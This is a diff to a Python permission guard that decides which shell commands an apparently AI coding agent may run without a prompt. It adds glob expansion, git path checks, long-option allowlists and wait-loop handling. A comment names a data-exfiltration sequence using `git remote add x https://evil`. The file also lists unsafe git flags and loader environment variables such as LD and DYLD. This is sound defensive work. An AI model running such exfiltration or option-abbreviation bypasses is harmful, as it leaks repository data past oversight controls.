@@ -20,6 +20,7 @@ and computed strings can still get past it.
 # macOS ships Python 3.9, which needs this for `str | None` annotations.
 from __future__ import annotations
 
+import glob
 import json
 import os
 import re
@@ -1787,10 +1788,10 @@ def chain_flags_ok(name: str, args: list) -> bool:
 # the permission layer as before. Their options are held to SAFE_SCRIPT_FLAGS, spelled in full (argparse
 # accepts abbreviations); `--repo` names the current directory only, and `--out` is snapshot's own file.
 CHAIN_SCRIPTS = frozenset(("snapshot", "rebuild-state", "claims", "frontier", "holds", "gate", "ci-times",
-                           "watch-ci", "worker-report", "lead-route", "lead-brief"))
+                           "watch-ci", "worker-report", "lead-route", "lead-brief", "prompts"))
 SAFE_SCRIPT_FLAGS = frozenset(("--parent", "--ticket", "--all", "--pr", "--base", "--branch", "--reviewer", "--since",
                                "--now", "--session", "--lead", "--cap", "--touch-map", "--literal", "--timeout", "--retry-delay",
-                               "--interval", "--no-run-after", "--stuck-after", "--verbose"))
+                               "--interval", "--no-run-after", "--stuck-after", "--verbose", "--watermark"))
 SNAPSHOT_FILE = ".claude/orchestrate-snapshot.json"
 
 
@@ -1873,14 +1874,32 @@ def chain_assignment_ok(cmd: Command, env: dict, cwd: str) -> bool:
     return True
 
 
+def report_heredoc(cmds: list, k: int, env: dict, cwd: str) -> bool:
+    """`cat <<'EOF' | "$S/worker-report" ...` (#567): a bare `cat` of one quoted heredoc, piped into the plugin's
+    worker-report. The body is data, never run (a quoted delimiter stops the shell expanding it), so it is as
+    harmless as the `printf ... |` the same script already takes."""
+    cmd = cmds[k]
+    if (len(cmd.words) != 1 or cmd.words[0].dynamic or cmd.words[0].text != "cat" or cmd.redirects or cmd.depth
+            or len(cmd.heredocs) != 1 or not cmd.heredocs[0].quoted or not cmd.heredocs[0].closed or cmd.ends != "|"
+            or k + 1 >= len(cmds)):
+        return False
+    nxt = cmds[k + 1]
+    resolved = resolve_word(nxt.words[0], env) if nxt.words else None
+    return resolved is not None and Path(os.path.realpath(os.path.join(cwd or ".", resolved))) == PLUGIN_SCRIPTS / "worker-report"
+
+
 def chain_approved(parsed: "Parsed", cwd: str) -> bool:
     """True when every simple command of the line is a plugin script, one of CHAIN_PLAIN, a `cat` under
     `.claude/`, or a variable assignment, joined by `;`, `&&`, `|` or a newline."""
-    env = {"CLAUDE_SKILL_DIR": str(SKILL_DIR)}
-    for cmd in parsed.cmds:
-        if cmd.depth or cmd.heredocs or not cmd.words or cmd.joiner not in CHAIN_JOINERS or cmd.ends not in CHAIN_JOINERS:
+    env = {"CLAUDE_SKILL_DIR": str(SKILL_DIR), "PWD": os.path.realpath(cwd or ".")}
+    for k, cmd in enumerate(parsed.cmds):
+        if cmd.depth or not cmd.words or cmd.joiner not in CHAIN_JOINERS or cmd.ends not in CHAIN_JOINERS:
             return False
-        if any(op != ">&" or target.text != "1" or target.dynamic for op, target in cmd.redirects):
+        if cmd.heredocs:
+            if not report_heredoc(parsed.cmds, k, env, cwd):
+                return False
+            continue
+        if not allowed_redirects(cmd):
             return False
         first = cmd.words[0]
         if ASSIGNMENT.fullmatch(first.text):
@@ -1917,7 +1936,7 @@ LOOP_VAR = re.compile(r"[A-Za-z_]\w*")
 LOOP_ITEM = re.compile(r"[A-Za-z0-9_./:@=+,%][A-Za-z0-9_./:@=+,%-]*")
 # A flag that writes or runs a program, by the prefix git, ripgrep or find would accept (getopt takes
 # abbreviations): refused whatever its spelling.
-GIT_READ_VERBS = frozenset(("status", "log", "diff", "show", "ls-remote", "ls-files", "rev-parse", "rev-list"))
+GIT_READ_VERBS = frozenset(("status", "log", "diff", "show", "ls-remote", "ls-files", "rev-parse", "rev-list", "grep"))
 GIT_UNSAFE_LONG = ("--output", "--ext-diff", "--upload-pack", "--exec", "--open-files-in-pager")
 GIT_BRANCH_READS = frozenset(("-a", "--all", "-r", "--remotes", "-v", "-vv", "--verbose", "--list", "--show-current"))
 GIT_FETCH_FLAGS = frozenset(("-q", "--quiet", "-v", "--verbose", "--no-tags", "--tags"))
@@ -2146,13 +2165,23 @@ def in_read_bound(arg: str, here: str, cwd: str) -> bool:
     return any(scratch_worktree(p, cwd) for p in (real, *real.parents) if p != Path("/"))
 
 
+FILE_TESTS = frozenset(("-e", "-f", "-d", "-s", "-r", "-w", "-x", "-L", "-h", "-p", "-S", "-b", "-c", "-g", "-u", "-k", "-O", "-G", "-N"))
+FILE_COMPARES = frozenset(("-nt", "-ot", "-ef"))
+PGREP_FLAGS = frozenset(("-f", "-x", "-l", "-a", "-c", "-i", "-n", "-o", "-q", "-d"))
+
+
 def read_paths_ok(name: str, args: list, here: str, cwd: str) -> bool:
     """Every path a read command names is inside the bound. A read with no path argument (stdin in a pipe)
     passes. A short flag with `/` or `~` glued to it counts as outside; a `--flag=value` value is checked as
     a path. sed's files, awk's operands after its program and grep's operands after its pattern are told
     apart from the script; any other word counts as a path, so a pattern like `/etc/x` just falls to the prompt."""
-    if name in ("echo", "true", "test", "[", "printf"):
+    if name in ("echo", "true", "printf", "pgrep"):
         return True
+    if name in ("test", "["):
+        # Only the operand of a file test names a path (`-e <path>`, `a -nt b`): the other words are strings.
+        operands = [args[i + 1] for i, a in enumerate(args[:-1]) if a in FILE_TESTS]
+        operands += [args[i + d] for i, a in enumerate(args) if a in FILE_COMPARES for d in (-1, 1) if 0 <= i + d < len(args)]
+        return all(o != "" and in_read_bound(o, here, cwd) for o in operands)
     check = []
     if name == "sed":
         parsed = sed_args(args)
@@ -2214,7 +2243,38 @@ def awk_program(args: list) -> int | None:
     return None
 
 
-def git_read_ok(cmd: Command, cwd: str = "") -> bool:
+def git_paths_ok(args: list, here: str, cwd: str) -> bool:
+    """Every path an approved git read names is inside the read bound (#567). `git diff --no-index a b` (and a
+    `git diff a b` with a path outside the repo, which git reads the same way) reads any file the way `cat`
+    does, so a word that is an absolute or `..` path, names an existing file, or follows `--` is held to the bound.
+    A revision (`origin/main`, `HEAD~3..HEAD`, `rev:path`, whose path is read from the repo's own objects) is not a file
+    on disk and passes."""
+    no_index = any(a.startswith("--") and len(a.partition("=")[0]) >= 4 and "--no-index".startswith(a.partition("=")[0])
+                   for a in args)
+    after_dashes = False
+    for a in args:
+        if a == "--" and not after_dashes:
+            after_dashes = True
+            continue
+        if not after_dashes and a.startswith("-"):
+            # `-O<file>` reads an orderfile and `-O<cmd>` of `git grep` runs a pager: neither is a plain read.
+            if a.startswith("-O") or ("=" in a and not a.startswith("--")):
+                return False
+            value = a.partition("=")[2] if a.startswith("--") else ""
+            if value and ("/" in value or value.startswith("~")) and not in_read_bound(value, here, cwd):
+                return False
+            continue
+        if after_dashes or no_index:
+            candidate = True
+        else:
+            parts = a.split("/")
+            candidate = (a.startswith(("/", "~")) or ".." in parts or os.path.lexists(os.path.join(here, a)))
+        if candidate and not in_read_bound(a, here, cwd):
+            return False
+    return True
+
+
+def git_read_ok(cmd: Command, cwd: str = "", here: str = ".") -> bool:
     call = parse_git(cmd.words, 0)
     if call.options or call.sub is None or call.sub.dynamic:
         return False
@@ -2224,11 +2284,15 @@ def git_read_ok(cmd: Command, cwd: str = "") -> bool:
            for a in args):
         return False
     if sub == "ls-remote":
-        # Only a remote configured in the repo, never a URL or path: a URL is a way to send data out (#566).
+        # Only `origin`, never a URL, a path or another configured remote: `git remote add x https://evil` followed by
+        # `git ls-remote x` would send data out (#566, #567). Nothing approves `git remote add` or `set-url`.
         positional = [a for a in args if not a.startswith("-")]
-        return bool(positional) and positional[0] in remote_names(cwd)
+        return bool(positional) and positional[0] == "origin" and "origin" in remote_names(cwd)
+    if sub == "remote":
+        # `git remote`, `-v`, and `get-url <name>` read the config; `show` contacts the remote, so it is not here.
+        return args in ([], ["-v"], ["--verbose"]) or (len(args) == 2 and args[0] == "get-url" and not args[1].startswith("-"))
     if sub in GIT_READ_VERBS:
-        return True
+        return git_paths_ok(args, here, cwd)
     if sub == "branch":
         return all(a in GIT_BRANCH_READS for a in args)
     if sub == "fetch":
@@ -2253,20 +2317,108 @@ def gh_read_ok(cmd: Command) -> bool:
     return False
 
 
+# The long options each read command may carry, spelled in full. getopt (and clap's `--fil`) take any prefix of a
+# long option, so an abbreviation of a checked option (`grep --fil`, `rg --pre`) would slip past a check written for
+# the full name. A long option outside the command's list is therefore refused, abbreviated or not (#567).
+_COMMON_LONG = {"--help", "--version"}
+LONG_OPTIONS = {
+    "grep": {"--recursive", "--dereference-recursive", "--line-number", "--ignore-case", "--no-ignore-case", "--include",
+             "--exclude", "--exclude-dir", "--files-with-matches", "--files-without-match", "--count", "--invert-match",
+             "--word-regexp", "--line-regexp", "--fixed-strings", "--extended-regexp", "--perl-regexp", "--basic-regexp",
+             "--only-matching", "--quiet", "--silent", "--no-messages", "--with-filename", "--no-filename", "--null",
+             "--text", "--after-context", "--before-context", "--context", "--max-count", "--color", "--colour",
+             "--regexp", "--file", "--byte-offset", "--initial-tab", "--binary-files", "--label", "--null-data",
+             "--no-ignore", "--line-buffered", "--binary", "--directories", "--devices", "--exclude-from"},
+    "ls": {"--all", "--almost-all", "--human-readable", "--recursive", "--reverse", "--directory", "--classify",
+           "--color", "--sort", "--time", "--size", "--inode", "--full-time", "--group-directories-first", "--dereference",
+           "--literal", "--hide", "--ignore", "--indicator-style", "--format", "--numeric-uid-gid", "--width"},
+    "cat": {"--number", "--show-all", "--squeeze-blank", "--number-nonblank", "--show-ends", "--show-tabs",
+            "--show-nonprinting"},
+    "head": {"--lines", "--bytes", "--quiet", "--silent", "--verbose"},
+    "wc": {"--lines", "--words", "--bytes", "--chars", "--max-line-length"},
+    "cut": {"--bytes", "--characters", "--fields", "--delimiter", "--complement", "--only-delimited",
+            "--output-delimiter"},
+    "tr": {"--delete", "--squeeze-repeats", "--complement", "--truncate-set1"},
+    "uniq": {"--count", "--repeated", "--unique", "--ignore-case", "--skip-fields", "--skip-chars", "--check-chars",
+             "--all-repeated", "--zero-terminated"},
+    "diff": {"--brief", "--unified", "--context", "--ignore-case", "--ignore-space-change", "--ignore-all-space",
+             "--ignore-blank-lines", "--recursive", "--new-file", "--text", "--side-by-side", "--color",
+             "--no-dereference", "--report-identical-files", "--minimal", "--show-c-function", "--ignore-tab-expansion",
+             "--ignore-trailing-space", "--strip-trailing-cr", "--exclude", "--from-file", "--to-file", "--label",
+             "--normal", "--ed", "--width", "--expand-tabs", "--initial-tab", "--suppress-common-lines"},
+    "sed": {"--quiet", "--silent", "--regexp-extended", "--separate", "--null-data", "--posix", "--line-length",
+            "--unbuffered", "--sandbox", "--debug", "--binary", "--follow-symlinks"},
+    "rg": {"--files", "--type-list", "--type", "--type-not", "--glob", "--iglob", "--hidden", "--no-ignore",
+           "--max-depth", "--line-number", "--no-line-number", "--ignore-case", "--smart-case", "--case-sensitive",
+           "--fixed-strings", "--word-regexp", "--line-regexp", "--count", "--count-matches", "--files-with-matches",
+           "--files-without-match", "--only-matching", "--context", "--after-context", "--before-context", "--json",
+           "--heading", "--no-heading", "--sort", "--sortr", "--regexp", "--file", "--invert-match", "--max-count",
+           "--no-messages", "--with-filename", "--no-filename", "--color", "--colour", "--multiline", "--pcre2",
+           "--null", "--text", "--column", "--vimgrep", "--stats", "--max-filesize", "--no-config", "--unrestricted",
+           "--quiet", "--replace", "--trim", "--follow", "--glob-case-insensitive", "--no-ignore-vcs", "--pretty"},
+}
+LONG_OPTIONS["egrep"] = LONG_OPTIONS["grep"]
+GLOB_SAFE = re.compile(r"[A-Za-z0-9_./*?\[\]+@%:=,!^-]+")
+
+
+def long_options_ok(name: str, args: list) -> bool:
+    """No long option the command's list (LONG_OPTIONS) doesn't spell in full; everything after `--` is operands."""
+    allowed = LONG_OPTIONS.get(name)
+    if allowed is None:
+        return True
+    for a in args:
+        if a == "--":
+            break
+        if a.startswith("--") and a.partition("=")[0] not in allowed | _COMMON_LONG:
+            return False
+    return True
+
+
+def expand_words(words: list, here: str) -> list | None:
+    """The texts of the words with each unquoted glob expanded the way the shell would, or None when one can't be
+    trusted (#567). A glob word is relative, has no `..`, and uses only `*`, `?` and `[...]`; a flag's glob
+    (`--include=*`) is kept as written, for the path check to judge its value. An expansion that names a file
+    starting with `-` would turn into an option, so it is refused. The expanded names go to the read bound, so a
+    symlink in the repo that leads out is caught by their resolved paths."""
+    out = []
+    for w in words:
+        if not w.glob:
+            out.append(w.text)
+            continue
+        text = w.text
+        if (not GLOB_SAFE.fullmatch(text) or ".." in text or text.startswith(("/", "~")) or "{" in text or "$" in text):
+            return None
+        if text.startswith("-"):
+            out.append(text)
+            continue
+        matches = sorted(glob.glob(os.path.join(glob.escape(here), text)))
+        if len(matches) > 2000 or any(os.path.basename(m).startswith("-") for m in matches):
+            return None
+        out.extend(matches or [text])
+    return out
+
+
 def read_command_ok(cmd: Command, here: str = ".", cwd: str = "") -> bool:
     """One simple command of plain words that only reads (the allowlist of #562), every path of it inside
-    the read bound (#566)."""
+    the read bound (#566). A relative glob is expanded and its matches are held to the bound (#567)."""
     first = cmd.words[0]
     name, words = first.text, cmd.words[1:]
-    args = [w.text for w in words]
-    if first.dynamic or any(w.dynamic or w.glob for w in words) or (first.glob and name != "["):
+    if first.dynamic or any(w.dynamic for w in words) or (first.glob and name != "["):
         return False
     if name in ("git", "gh"):
-        return git_read_ok(cmd, cwd) if name == "git" else gh_read_ok(cmd)
-    if not read_paths_ok(name, args, here, cwd):
+        if any(w.glob for w in words):
+            return False
+        return git_read_ok(cmd, cwd, here) if name == "git" else gh_read_ok(cmd)
+    expanded = expand_words(words, here)
+    if expanded is None:
+        return False
+    args = expanded
+    if not long_options_ok(name, args) or not read_paths_ok(name, args, here, cwd):
         return False
     if name in READ_PLAIN:
         return True
+    if name == "pgrep":
+        return all(a in PGREP_FLAGS or not a.startswith("-") for a in args)
     if name == "[":
         return bool(args) and args[-1] == "]"
     if name == "printf":
@@ -2372,8 +2524,54 @@ def substitute(cmd: Command, values: dict) -> Command | None:
         if not w.names or any(name not in values for name in w.names):
             return None
         names = iter(w.names)
-        words.append(Word("".join(values[next(names)] if ch == EXP else ch for ch in w.text), False, w.quoted, w.glob))
+        text = "".join(values[next(names)] if ch == EXP else ch for ch in w.text)
+        # Whether the word still globs depends on the text it became: an unquoted `$R` is flagged as a glob before its
+        # value is known, and `origin/main` is not one.
+        words.append(Word(text, False, w.quoted, bool(re.search(r"[*?\[{~$]", text))))
     return Command(words, cmd.redirects, cmd.heredocs, cmd.depth, cmd.joiner, cmd.ends)
+
+
+# A variable a program the command runs may read from its environment (`GH_HOST`, `GIT_DIR`, `PYTHONPATH`, ...). A
+# plain assignment is not exported unless the name is already in the environment, so the names below, and any name
+# the guard's own environment holds, are never taken as a scratch variable (#567).
+RESERVED_VARIABLE = re.compile(r"(?:GH|GIT|PYTHON|LC|SSH|NODE|PERL|RUBY|EDITOR|VISUAL|PAGER|XDG|TERM|TMP|LANG|TZ|"
+                               r"PATH|IFS|ENV|CDPATH|SHELL|HOME|BASH|LD|DYLD|PS|CLAUDE|ANTHROPIC)\w*")
+
+
+def literal_assignment(w: Word) -> bool:
+    """`NAME=word`, the word plain characters (a ref, a sha, a short path), and NAME a fresh variable no program reads."""
+    m = ASSIGNMENT.fullmatch(w.text)
+    return bool(m) and not w.dynamic and not w.glob and not RESERVED_VARIABLE.fullmatch(m.group(1)) and (
+        m.group(1) not in os.environ) and (m.group(2) == "" or LOOP_ITEM.fullmatch(m.group(2)) is not None)
+
+
+def sleep_ok(cmd: Command) -> bool:
+    """`sleep N` with a plain number, the pause of a wait loop."""
+    return (len(cmd.words) == 2 and cmd.words[0].text == "sleep" and not cmd.redirects
+            and re.fullmatch(r"\d+(?:\.\d+)?", cmd.words[1].text) is not None)
+
+
+REVIEW_SCRATCH = re.compile(r"pr-\d+[A-Za-z]?(?:-[\w.-]+)?")
+
+
+def reviewer_worktree_ok(cmd: Command, cwd: str) -> bool:
+    """A reviewer's `git worktree add --detach <dir> <ref>` (agents/reviewer.md): the one scratch root the guard approves
+    is a directory named `pr-<n>` (a letter or `-<suffix>` after it) under a temp dir (`/tmp/c<ticket>/scratch/pr-5`, the
+    session scratchpad), outside the repo (#567). The rules already refuse the other worktree forms."""
+    if any(w.dynamic or w.glob for w in cmd.words):
+        return False
+    call = parse_git(cmd.words, 0)
+    if call.options or not call.is_sub("worktree") or not call.args or call.args[0].text != "add":
+        return False
+    if reviewer_git_problem(call, cwd):
+        return False
+    names = [a.text for a in call.args[1:] if not a.text.startswith("-")]
+    if not names or not names[0].startswith("/"):
+        return False
+    target = Path(os.path.realpath(names[0]))
+    in_temp = any(str(target).startswith(t + "/") for t in TEMP_ROOTS)
+    return (in_temp and REVIEW_SCRATCH.fullmatch(target.name) is not None
+            and (len(names) == 1 or re.fullmatch(r"[\w./@^~-]+", names[1]) is not None))
 
 
 def compound_approved(role: str | None, parsed: "Parsed", cwd: str, session: str = "") -> bool:
@@ -2387,6 +2585,9 @@ def compound_approved(role: str | None, parsed: "Parsed", cwd: str, session: str
         return False
     here, env = os.path.realpath(cwd or "."), {"CLAUDE_SKILL_DIR": str(SKILL_DIR)}
     loop, pending = None, None  # the open loop's (name, values); a `for` waiting for its `do`
+    waiting = None  # inside `until|while <test>; do <body>; done`: "test" until its `do`, then "body"
+    values = {}  # literal `NAME=word` assignments seen so far, for the reads that use them
+    env["PWD"] = here
     for k, cmd in enumerate(parsed.cmds):
         if cmd.depth or cmd.heredocs or not cmd.words or cmd.joiner not in COMPOUND_JOINERS or cmd.ends not in COMPOUND_JOINERS:
             return False
@@ -2394,7 +2595,27 @@ def compound_approved(role: str | None, parsed: "Parsed", cwd: str, session: str
         if head.dynamic:
             if not orchestrator or not allowed_redirects(cmd):
                 return False
-        elif head.text == "for" and loop is None and pending is None:
+        elif head.text in ("until", "while") and loop is None and pending is None and waiting is None:
+            # A wait loop (#567): `until [!] <read-only test>; do sleep N; done`. The test and the body must each be
+            # an approved read (the body may also `sleep N`), so a loop that writes is not approved.
+            rest = cmd.words[1:]
+            if rest and not rest[0].dynamic and rest[0].text == "!":
+                rest = rest[1:]
+            if not rest or cmd.ends not in (";", "\n", "&&", "||") or cmd.joiner not in (None, ";", "&&", "\n"):
+                return False
+            waiting = "test"
+            cmd = Command(rest, cmd.redirects, cmd.heredocs, cmd.depth, cmd.joiner, cmd.ends)
+        elif waiting == "test" and head.text == "do":
+            if cmd.ends not in (";", "\n"):
+                return False
+            waiting = "body"
+            if len(cmd.words) == 1 and not cmd.redirects:
+                continue
+            cmd = Command(cmd.words[1:], cmd.redirects, cmd.heredocs, cmd.depth, cmd.joiner, cmd.ends)
+        elif waiting == "body" and head.text == "done" and len(cmd.words) == 1 and not cmd.redirects:
+            waiting = None
+            continue
+        elif head.text == "for" and loop is None and pending is None and waiting is None:
             words = cmd.words
             if (cmd.redirects or len(words) < 4 or words[2].text != "in" or not LOOP_VAR.fullmatch(words[1].text)
                     or cmd.ends not in (";", "\n")
@@ -2429,24 +2650,36 @@ def compound_approved(role: str | None, parsed: "Parsed", cwd: str, session: str
                 return False
             here = str(real)
             continue
-        if orchestrator:
-            if ASSIGNMENT.fullmatch(cmd.words[0].text):
-                if not chain_assignment_ok(cmd, env, cwd):
-                    return False
+        if ASSIGNMENT.fullmatch(cmd.words[0].text) and loop is None and waiting is None:
+            if orchestrator and not any(w.text.partition("=")[0] in values for w in cmd.words) and chain_assignment_ok(cmd, env, cwd):
                 continue
+            # A plain `NAME=word` assignment of literal words (`R=origin/main`), for the reads after it to use.
+            # Not in a pipeline (the shell would run it in a subshell, and the value would not exist after).
+            if (cmd.joiner == "|" or cmd.ends not in (";", "&&", "\n") or cmd.redirects
+                    or not all(literal_assignment(w) and w.text.partition("=")[0] not in env for w in cmd.words)):
+                return False
+            for w in cmd.words:
+                name, _, value = w.text.partition("=")
+                values[name] = value
+            continue
+        if orchestrator and waiting is None:
             if chain_script_ok(cmd, env, here):  # relative paths resolve from the dir after a leading cd
                 continue
         for value in (loop[1] if loop else [None]):
-            sub = substitute(cmd, {"?": "0", **({loop[0]: value} if loop else {})})
+            sub = substitute(cmd, {"?": "0", **values, **({loop[0]: value} if loop else {})})
             if sub is None or not sub.words or sub.words[0].dynamic:
                 return False
             one = Parsed([sub])
             plain = one_plain_command(one)
+            if waiting:
+                if not (read_command_ok(sub, here, cwd) or (waiting == "body" and sleep_ok(sub))):
+                    return False
+                continue
             if not (read_command_ok(sub, here, cwd) or (plain is not None and routine_single(role, one, plain, cwd, session))
                     or (role == "worker" and worker_work_ok(sub, here, worktree))
-                    or (role == "reviewer" and reviewer_verify_ok(sub, here, cwd))):
+                    or (role == "reviewer" and (reviewer_verify_ok(sub, here, cwd) or reviewer_worktree_ok(sub, cwd)))):
                 return False
-    return loop is None and pending is None
+    return loop is None and pending is None and waiting is None
 
 
 def approval(role: str | None, command: str, cwd: str, session: str = "") -> bool:
